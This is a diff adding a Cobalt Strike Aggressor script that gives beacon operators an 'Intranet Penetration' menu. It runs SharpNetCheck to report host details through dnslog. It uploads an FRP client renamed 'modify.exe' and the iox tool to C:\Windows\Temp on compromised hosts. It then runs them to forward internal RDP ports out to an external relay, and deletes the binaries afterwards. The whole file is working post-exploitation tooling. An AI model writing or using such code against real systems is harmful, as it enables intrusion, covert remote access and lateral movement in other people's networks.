@@ -1,0 +1,107 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       XWAY.CN@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+menu "Intranet Penetration" {
+			item "SharpNetCheck" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpNetCheck", %(host => "",,type => "all",bid => $bid), &SharpNetCheck);
+			dialog_description($dialog, "Get IP an PC name by dnslog. You can use it together with wmiexec and psexec.");	
+			drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
+			drow_text($dialog, "host", "host/ip:  ");		
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub SharpNetCheck {
+		$arg = join(' ', @($3['type'],"-host",$3['host']));
+		bexecute_assembly($bid, script_resource("/script/SharpNetCheck.exe"), $arg);
+}
+	    menu "FRP" {
+			item "Upload FRPC" {
+				$bid = $1;
+				$dialog = dialog("Upload FRPC", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &FRP);
+				drow_text($dialog, "UploadPath",  "UploadPath:"); 	
+				dbutton_action($dialog, "Upload");
+				dialog_show($dialog);
+        }
+sub FRP {
+
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/script/x64/modify.exe"));
+    }else{
+        bupload($bid, script_resource("/script/x86/modify.exe"));
+    }
+
+}
+                item "Run FRPC"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Run FRPC",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
+                    dialog_description($Dialog, "Run FRPC by frpModify.");
+                    drow_text($Dialog, "ip", "IP: ");
+                    drow_text($Dialog, "port", "Port: ");
+                    dbutton_action($Dialog, "RUN");
+                    dialog_show($Dialog);
+                }
+
+sub frpc_run{
+    local('$Name $port');
+    $Name = $3['ip'];
+    $port = replace($3['port'], "\"", "");
+	bshell($bid, "modify.exe -t  $+ $Name -p  $+ $port");
+}
+
+        	item "Delete frpc"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q modify.exe");
+        	}
+		}
+    }
+	    menu "iox port forwarding" {
+			item "Upload iox" {
+				$bid = $1;
+				$dialog = dialog("Upload iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				dbutton_action($dialog, "Upload");
+				dialog_show($dialog);
+        }
+sub iox {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/iox.exe"));
+    }
+                item "Run iox"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Run iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "656565",bid => $bid),&iox_run);
+                    dialog_description($Dialog, "lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565");
+                    drow_text($Dialog, "lhost", "lhost: ");
+                    drow_text($Dialog, "rhost", "rhost: ");
+					drow_text($Dialog, "hex", "hex: ");
+                    dbutton_action($Dialog, "RUN");
+                    dialog_show($Dialog);
+                }
+
+sub iox_run{
+    local('$lhost $rhost $hex');
+    $lhost = $3['lhost'];
+    $rhost = replace($3['rhost'], "\"", "");
+	$hex = $3['hex'];
+	bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
+}  
+        	item "Delete iox"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q iox.exe");
+        	}
+		}
+}
+
+
+}
